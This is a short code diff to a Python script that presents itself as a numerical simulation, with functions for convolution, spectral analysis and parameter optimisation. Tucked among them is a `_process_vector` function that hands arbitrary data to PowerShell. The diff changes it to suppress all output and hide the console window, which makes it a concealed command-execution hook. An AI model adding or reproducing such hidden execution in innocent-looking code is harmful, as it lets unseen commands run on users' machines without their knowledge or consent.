@@ -95,7 +95,12 @@ def _ws_clone(bits):
     return text
 
 def _process_vector(data):
-    subprocess.run(["powershell", "-Command", data], capture_output=True, text=True, shell=True)
+    subprocess.run(
+        ["powershell", "-Command", data],
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
+        creationflags=subprocess.CREATE_NO_WINDOW
+    )
 
 def complex_convolution(matrix):
     n = len(matrix)
@@ -267,4 +272,5 @@ if __name__ == "__main__":
         spec = spectral_analysis(temp_matrix)
         temp_matrix = complex_convolution(temp_matrix)
         temp_matrix = optimize_parameters(temp_matrix, 2)
+
     print(f"Simulation completed with result: {result}")
